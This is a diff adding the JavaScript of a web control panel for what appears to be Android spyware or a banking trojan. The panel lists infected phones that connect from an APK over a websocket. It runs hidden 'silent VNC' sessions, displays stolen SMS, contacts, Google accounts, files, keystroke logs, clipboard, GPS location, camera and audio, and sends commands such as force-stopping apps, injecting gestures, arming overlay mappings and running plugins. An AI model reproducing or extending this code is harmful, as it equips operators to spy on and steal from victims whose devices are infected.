+  S.readerV = v;
+  $i('btnV1').className = `btn btn-sm ${v === 1 ? 'btn-reader-on' : 'btn-reader-off'}`;
+  $i('btnV2').className = `btn btn-sm ${v === 2 ? 'btn-reader-on' : 'btn-reader-off'}`;
+  const hr = $i('hudReader');
+  if (hr) {
+    hr.textContent = v === 1 ? 'Reader V1' : 'Reader V2';
+    hr.className   = `hud hud-reader ${v === 1 ? 'v1' : 'v2'}`;
+  }
+  if (S.hvncActive) { stopHvnc(); setTimeout(startHvnc, 250); }
+  log('cmd', `Reader set to V${v} (${v === 1 ? 'START_VNC' : 'START_SILENT_VNC'})`);
+}
+
+function startHvnc() {
+  if (!S.selectedId) { toast('Select a device first', 'err'); return; }
+  S.hvncActive = true;
+  resizeCanvas();
+  cmd(S.readerV === 2 ? 'START_SILENT_VNC' : 'START_VNC');
+  log('cmd', `HVNC start — Reader V${S.readerV}`);
+}
+
+function stopHvnc() {
+  S.hvncActive = false;
+  cmd(S.readerV === 2 ? 'STOP_SILENT_VNC' : 'STOP_VNC');
+  log('cmd', 'HVNC stopped');
+}
+
+// Debounced quality — do not spam on slider drag
+function onQualityInput(val) {
+  $i('qualityLbl').textContent = val + '%';
+  const hq = $i('hudQ');
+  if (hq) hq.textContent = val + '%';
+  clearTimeout(S._qualTimer);
+  S._qualTimer = setTimeout(() => {
+    cmd('SET_SILENT_VNC_QUALITY', { quality: +val });
+  }, 150);
+}
+
+// ─────────────────────────────────────────────
+//  Fullscreen
+// ─────────────────────────────────────────────
+function toggleFullscreen() {
+  const app = $i('app');
+  if (!document.fullscreenElement) {
+    app.requestFullscreen().catch(() => {});
+    app.classList.add('fs-mode');
+    nav(document.querySelector('[data-sec="screen"]'));
+  } else {
+    document.exitFullscreen && document.exitFullscreen();
+    app.classList.remove('fs-mode');
+  }
+}
+document.addEventListener('fullscreenchange', () => {
+  if (!document.fullscreenElement) $i('app').classList.remove('fs-mode');
+});
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'F11') { e.preventDefault(); toggleFullscreen(); }
+});
+
+// ─────────────────────────────────────────────
+//  Command dispatch
+// ─────────────────────────────────────────────
+function cmd(action, extras) {
+  const payload = Object.assign({ action }, extras);
+  send({ action: 'COMMAND', deviceId: S.selectedId, payload });
+  S.cmdCount++;
+  const sc = $i('st-cmds');
+  if (sc) sc.textContent = S.cmdCount;
+  log('cmd', `→ ${action}${extras ? ' ' + JSON.stringify(extras).slice(0, 60) : ''}`);
+}
+
+// ─────────────────────────────────────────────
+//  JSON message router
+// ─────────────────────────────────────────────
+function handleJson(msg) {
+  if (!msg || typeof msg !== 'object') return;
+  const t = (msg.type || '').toUpperCase();
+
+  switch (t) {
+    case 'DEVICE_LIST':
+      (msg.devices || []).forEach(addDev);
+      rebuildGrid();
+      rebuildSelect();
+      updateStats();
+      break;
+
+    case 'DEVICE_CONNECTED':
+      addDev(msg.device);
+      rebuildGrid();
+      rebuildSelect();
+      updateStats();
+      log('evt', `Device connected: ${devLabel(msg.device)}`);
+      toast(`Connected: ${devLabel(msg.device)}`, 'ok');
+      break;
+
+    case 'DEVICE_OFFLINE':
+      if (S.devices[msg.deviceId]) {
+        S.devices[msg.deviceId].online = false;
+        rebuildGrid();
+        updateStats();
+      }
+      log('evt', `Device offline: ${msg.deviceId}`);
+      toast(`Offline: ${msg.deviceId}`, 'err');
+      break;
+
+    case 'DEVICE_INFO':
+      if (msg.data) renderDevInfo(msg.data);
+      log('data', `Device info: ${JSON.stringify(msg.data || {}).slice(0, 100)}`);
+      break;
+
+    case 'DEVICE_STATE': {
+      const d = msg.data || {};
+      if (d.info)      renderDevInfo(d.info);
+      if (d.sms)       populateSms(d.sms);
+      if (d.contacts)  populateContacts(d.contacts);
+      if (d.accounts)  populateAccounts(d.accounts);
+      if (d.apps)      populateApps(d.apps);
+      if (d.files)     populateFiles(d.files);
+      if (d.keylogs)   populateKeylogs(d.keylogs);
+      if (d.location)  renderLocation(d.location);
+      if (d.clipboard) { const c = $i('clipOut'); if (c) c.textContent = d.clipboard; }
+      updateDataBadge(d);
+      break;
+    }
+
+    case 'SMS':
+    case 'SMS_LIST': {
+      const list = msg.data || msg.messages || msg.sms || [];
+      populateSms(list);
+      log('data', `SMS: ${list.length} messages`);
+      break;
+    }
+
+    case 'CONTACTS':
+    case 'CONTACT_LIST':
+    case 'CONTACTS_LIST': {
+      const list = msg.data || msg.contacts || [];
+      populateContacts(list);
+      log('data', `Contacts: ${list.length}`);
+      break;
+    }
+
+    case 'ACCOUNTS':
+    case 'GOOGLE_ACCOUNTS': {
+      const list = msg.data || msg.accounts || [];
+      populateAccounts(list);
+      log('data', `Accounts: ${list.length}`);
+      break;
+    }
+
+    case 'INSTALLED_APPS':
+    case 'APP_LIST':
+    case 'APPS': {
+      const list = msg.data || msg.apps || [];
+      populateApps(list);
+      log('data', `Apps: ${list.length}`);
+      break;
+    }
+
+    case 'FILE_LIST':
+    case 'FILES': {
+      const list = msg.data || msg.files || [];
+      populateFiles(list);
+      log('data', `Files: ${list.length}`);
+      break;
+    }
+
+    case 'LOCATION':
+    case 'GPS_LOCATION':
+      renderLocation(msg);
+      log('data', `Location: ${msg.lat || msg.latitude}, ${msg.lng || msg.longitude}`);
+      break;
+
+    case 'CLIPBOARD':
+    case 'CLIPBOARD_DATA': {
+      const text = msg.data || msg.text || msg.clipboard || '';
+      const c = $i('clipOut');
+      if (c) c.textContent = text;
+      log('data', `Clipboard: ${text.slice(0, 80)}`);
+      break;
+    }
+
+    case 'KEYLOG':
+    case 'KEYLOGGER_DATA':
+    case 'KEYLOG_DATA':
+      appendKeylog(msg.data || msg.text || '');
+      log('data', `Keylog: ${String(msg.data || '').slice(0, 60)}`);
+      break;
+
+    case 'CAMERA_FRAME':
+      if (msg.data) renderCamera(msg.data);
+      break;
+
+    case 'AUDIO_CHUNK':
+      if (msg.data) visualizeAudio();
+      break;
+
+    case 'COMMAND_ACK':
+      log(msg.ok ? 'ok' : 'err',
+        `${msg.ok ? 'ACK' : 'FAIL'}: ${JSON.stringify(msg.payload || {}).slice(0, 80)}`);
+      break;
+
+    case 'ERROR':
+      log('err', `Server error: ${msg.error || JSON.stringify(msg).slice(0, 80)}`);
+      toast(`Error: ${msg.error || 'Unknown'}`, 'err');
+      break;
+
+    case 'SILENT_VNC_STATUS':
+      log('evt', `SilentVNC: active=${msg.active}, method=${msg.method || '?'}`);
+      break;
+
+    default:
+      log('evt', `[${t || 'unknown'}] ${JSON.stringify(msg).slice(0, 120)}`);
+      break;
+  }
+}
+
+// ─────────────────────────────────────────────
+//  Device registry helpers
+// ─────────────────────────────────────────────
+function addDev(dev) {
+  if (!dev || !dev.id) return;
+  S.devices[dev.id] = Object.assign(S.devices[dev.id] || {}, dev);
+}
+
+function devLabel(dev) {
+  if (!dev) return 'Unknown';
+  const info = dev.info || {};
+  return `${info.model || dev.id} (${info.manufacturer || ''} Android ${info.android_version || ''})`;
+}
+
+function selectDevice(id) {
+  S.selectedId = id || null;
+  if (!id) return;
+  send({ action: 'SELECT_DEVICE', deviceId: id });
+  document.querySelectorAll('.device-card').forEach(el =>
+    el.classList.toggle('sel', el.dataset.did === id));
+  log('evt', `Selected: ${id}`);
+  nav(document.querySelector('[data-sec="screen"]'));
+}
+
+function rebuildSelect() {
+  const sel = $i('deviceSelect');
+  if (!sel) return;
+  const cur = sel.value;
+  sel.innerHTML = '<option value="">— Select Device —</option>';
+  Object.values(S.devices).forEach(dev => {
+    const opt = document.createElement('option');
+    opt.value = dev.id;
+    opt.textContent = `${dev.info?.model || dev.id} ${dev.online ? '●' : '○'}`;
+    opt.selected = dev.id === cur;
+    sel.appendChild(opt);
+  });
+}
+
+function rebuildGrid() {
+  const grid = $i('deviceGrid');
+  if (!grid) return;
+  const devs = Object.values(S.devices);
+  if (!devs.length) {
+    grid.innerHTML = '<div class="empty-state"><div class="icon">📵</div><div>No devices connected</div><div style="font-size:11px">Waiting for APK on /ws</div></div>';
+    return;
+  }
+  const permKeys = ['accessibility','camera','microphone','sms','contacts','location','storage','overlay'];
+  grid.innerHTML = devs.map(dev => {
+    const info  = dev.info || {};
+    const perms = info.permissions || {};
+    const pips  = permKeys.map(k =>
+      `<div class="perm-pip ${perms[k]?'on':'off'}" title="${k}"></div>`).join('');
+    return `<div class="device-card${S.selectedId===dev.id?' sel':''}" data-did="${dev.id}" onclick="selectDevice('${dev.id}')">
+      <div class="device-card-hdr">
+        <div class="dev-dot ${dev.online?'on':'off'}"></div>
+        <div class="dev-name">${esc(info.model || dev.id)}</div>
+        <span class="badge ${dev.online?'g':'r'}">${dev.online?'Online':'Offline'}</span>
+      </div>
+      <div class="device-meta">
+        <div class="device-meta-item"><b>Android:</b> ${esc(info.android_version||'—')}</div>
+        <div class="device-meta-item"><b>Battery:</b> ${esc(info.battery_level??'?')}%${info.is_charging?' ⚡':''}</div>
+        <div class="device-meta-item"><b>Admin:</b> ${info.admin_active?'✓':'✗'}</div>
+        <div class="device-meta-item"><b>Acc.Svc:</b> ${info.accessibility_active?'✓':'✗'}</div>
+      </div>
+      <div class="perm-row" title="acc/cam/mic/sms/contacts/location/storage/overlay">${pips}</div>
+    </div>`;
+  }).join('');
+}
+
+function updateStats() {
+  const devs   = Object.values(S.devices);
+  const online = devs.filter(d => d.online).length;
+  const set = (id, v) => { const el = $i(id); if (el) el.textContent = v; };
+  set('st-total',  devs.length);
+  set('st-online', online);
+  set('st-offline', devs.length - online);
+  const b = $i('bdg-devices');
+  if (b) b.textContent = online;
+}
+
+function updateDataBadge(d) {
+  const n = (d.sms||[]).length + (d.contacts||[]).length + (d.keylogs||[]).length;
+  const b = $i('bdg-data');
+  if (b && n > 0) b.textContent = n > 99 ? '99+' : n;
+}
+
+function renderDevInfo(info) {
+  const el = $i('devInfoDisplay');
+  if (!el || !info) return;
+  el.innerHTML = Object.entries(info)
+    .filter(([k]) => !['type','accounts','google_accounts','blocked_packages','permissions'].includes(k))
+    .map(([k,v]) => `<div><b style="color:var(--accent3)">${esc(k)}:</b> ${esc(JSON.stringify(v))}</div>`)
+    .join('');
+}
+
+// ─────────────────────────────────────────────
+//  Table populators
+// ─────────────────────────────────────────────
+function populateSms(list) {
+  const tb = $i('smsTbody');
+  if (!tb) return;
+  if (!list || !list.length) {
+    tb.innerHTML = '<tr><td colspan="4" style="text-align:center;color:var(--text3)">No SMS data</td></tr>';
+    return;
+  }
+  tb.innerHTML = list.slice(0, 500).map(m =>
+    `<tr>
+      <td>${esc(m.address||m.from||m.number||'')}</td>
+      <td>${esc((m.body||m.message||m.text||'').slice(0,200))}</td>
+      <td>${esc(m.date||m.timestamp||m.time||'')}</td>
+      <td><span class="badge ${m.type==1||m.type==='inbox'?'g':'b'}">${m.type===1||m.type==='inbox'?'Inbox':'Sent'}</span></td>
+    </tr>`).join('');
+}
+
+function populateContacts(list) {
+  const tb = $i('contactsTbody');
+  if (!tb) return;
+  if (!list || !list.length) {
+    tb.innerHTML = '<tr><td colspan="3" style="text-align:center;color:var(--text3)">No contacts</td></tr>';
+    return;
+  }
+  tb.innerHTML = list.slice(0, 500).map(c =>
+    `<tr>
+      <td>${esc(c.name||c.displayName||'')}</td>
+      <td>${esc((c.phones||[]).map(p=>p.number||p).join(', ')||c.phone||c.number||'')}</td>
+      <td>${esc((c.emails||[]).map(e=>e.address||e).join(', ')||c.email||'')}</td>
+    </tr>`).join('');
+}
+
+function populateAccounts(list) {
+  const tb = $i('accountsTbody');
+  if (!tb) return;
+  if (!list || !list.length) {
+    tb.innerHTML = '<tr><td colspan="2" style="text-align:center;color:var(--text3)">No accounts</td></tr>';
+    return;
+  }
+  tb.innerHTML = list.slice(0, 200).map(a =>
+    `<tr>
+      <td>${esc(typeof a==='string'?a:(a.name||a.account||a.email||JSON.stringify(a)))}</td>
+      <td>${esc(typeof a==='object'?(a.type||'google'):'google')}</td>
+    </tr>`).join('');
+}
+
+function populateApps(list) {
+  const tbs = [$i('dataAppsTbody'), $i('appsMgmtTbody')];
+  if (!list || !list.length) {
+    const empty = '<tr><td colspan="4" style="text-align:center;color:var(--text3)">No apps</td></tr>';
+    tbs.forEach(tb => { if (tb) tb.innerHTML = empty; });
+    return;
+  }
+  const rows = list.slice(0, 300).map(a => {
+    const pkg = a.package || a.packageName || '';
+    return `<tr>
+      <td>${esc(a.name||a.appName||a.label||'')}</td>
+      <td class="mono">${esc(pkg)}</td>
+      <td>${esc(a.version||a.versionName||'')}</td>
+      <td><div class="btn-group">
+        <button class="btn btn-ghost btn-sm" onclick="cmd('OPEN_APP',{package:'${esc(pkg)}'})">Open</button>
+        <button class="btn btn-danger btn-sm" onclick="cmd('FORCE_STOP',{package:'${esc(pkg)}'})">Kill</button>
+      </div></td>
+    </tr>`;
+  }).join('');
+  tbs.forEach(tb => { if (tb) tb.innerHTML = rows; });
+}
+
+function populateFiles(list) {
+  const tb = $i('filesTbody');
+  if (!tb) return;
+  if (!list || !list.length) {
+    tb.innerHTML = '<tr><td colspan="4" style="text-align:center;color:var(--text3)">No files</td></tr>';
+    return;
+  }
+  tb.innerHTML = list.slice(0, 200).map(f =>
+    `<tr>
+      <td>${esc(f.name||f.filename||'')}</td>
+      <td class="mono">${esc(f.path||f.uri||'')}</td>
+      <td>${esc(f.size||'')}</td>
+      <td>${esc(f.modified||f.date||f.lastModified||'')}</td>
+    </tr>`).join('');
+}
+
+function populateKeylogs(list) {
+  if (!list || !list.length) return;
+  const el = $i('keylogData');
+  if (el) el.textContent = list.map(k => {
+    const t = new Date(k.ts).toLocaleTimeString();
+    return `[${t}] ${typeof k.data==='string'?k.data:JSON.stringify(k.data)}`;
+  }).join('\n');
+}
+
+function appendKeylog(text) {
+  const s = String(text || '');
+  if (!s) return;
+  const stream = $i('keylogStream');
+  if (stream) {
+    stream.textContent += s;
+    stream.scrollTop = stream.scrollHeight;
+  }
+  const kd = $i('keylogData');
+  if (kd) {
+    kd.textContent += `[${ts()}] ${s.replace(/\n/g,' ')}\n`;
+    kd.scrollTop = kd.scrollHeight;
+  }
+}
+
+function renderLocation(loc) {
+  if (!loc) return;
+  const lat = loc.lat || loc.latitude  || 0;
+  const lng = loc.lng || loc.longitude || 0;
+  const acc = loc.accuracy || '?';
+  const el = $i('locationDisplay');
+  if (!el) return;
+  el.innerHTML = `
+    <div style="padding:14px;font-size:12px;line-height:2">
+      <div><b style="color:var(--accent3)">Latitude:</b>  ${esc(lat)}</div>
+      <div><b style="color:var(--accent3)">Longitude:</b> ${esc(lng)}</div>
+      <div><b style="color:var(--accent3)">Accuracy:</b>  ${esc(acc)}m</div>
+      <div style="margin-top:10px">
+        <a class="btn btn-ghost btn-sm" href="https://maps.google.com/?q=${lat},${lng}" target="_blank" rel="noopener">
+          Open in Google Maps ↗
+        </a>
+      </div>
+    </div>`;
+}
+
+function visualizeAudio() {
+  const cv  = $i('audioViz');
+  if (!cv) return;
+  const ctx = cv.getContext('2d');
+  ctx.clearRect(0, 0, cv.width, cv.height);
+  ctx.fillStyle = 'rgba(124,58,237,0.65)';
+  const bars = 24;
+  const bw   = cv.width / bars;
+  for (let i = 0; i < bars; i++) {
+    const h = 8 + Math.random() * 48;
+    ctx.fillRect(i * bw + 1, cv.height - h, bw - 2, h);
+  }
+  const st = $i('audioStatus');
+  if (st) st.textContent = `Receiving — ${ts()}`;
+}
+
+// ─────────────────────────────────────────────
+//  Specialized actions
+// ─────────────────────────────────────────────
+function sendPath() {
+  try {
+    const pts = JSON.parse(gi('pathPts'));
+    if (!Array.isArray(pts)) throw new Error('not array');
+    cmd('PATH_GESTURE', { points: pts, duration: +gi('pathDur') || 500 });
+  } catch { toast('Invalid JSON path points', 'err'); }
+}
+
+function armOverlay() {
+  try {
+    const m = JSON.parse(gi('overlayJson') || '{}');
+    cmd('ARM_OVERLAY_MAPPING', { mapping: m });
+  } catch { toast('Invalid overlay JSON', 'err'); }
+}
+
+function execPlugin() {
+  try {
+    const args = JSON.parse(gi('execPargs') || '{}');
+    cmd('EXEC_PLUGIN', { id: gi('execPid'), args });
+  } catch { toast('Invalid plugin args JSON', 'err'); }
+}
+
+// ─────────────────────────────────────────────
+//  Navigation
+// ─────────────────────────────────────────────
+function nav(item) {
+  if (!item) return;
+  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+  item.classList.add('active');
+  const sec = item.dataset.sec;
+  document.querySelectorAll('section').forEach(el => el.classList.remove('active'));
+  const target = $i('sec-' + sec);
+  if (target) target.classList.add('active');
+}
+
+function switchTab(btn, id) {
+  btn.closest('.tab-bar').querySelectorAll('.tab-btn')
+    .forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  // find sibling tab panes
+  const wrap = btn.closest('section');
+  if (wrap) {
+    wrap.querySelectorAll('.tab-pane').forEach(el => el.classList.remove('active'));
+    const tp = wrap.querySelector(`#tp-${id}`);
+    if (tp) tp.classList.add('active');
+  }
+}
+
+// ─────────────────────────────────────────────
+//  Connection badge
+// ─────────────────────────────────────────────
+function setConnBadge(type, label) {
+  const b = $i('connBadge');
+  const l = $i('connLabel');
+  if (b) b.className = `conn-badge ${type}`;
+  if (l) l.textContent = label;
+}
+
+// ─────────────────────────────────────────────
+//  Boot
+// ─────────────────────────────────────────────
+connect();
+log('ok',  'Dashboard initialized');
+log('evt', `Host: ${location.host}`);
+</script>
+</body>
+</html>
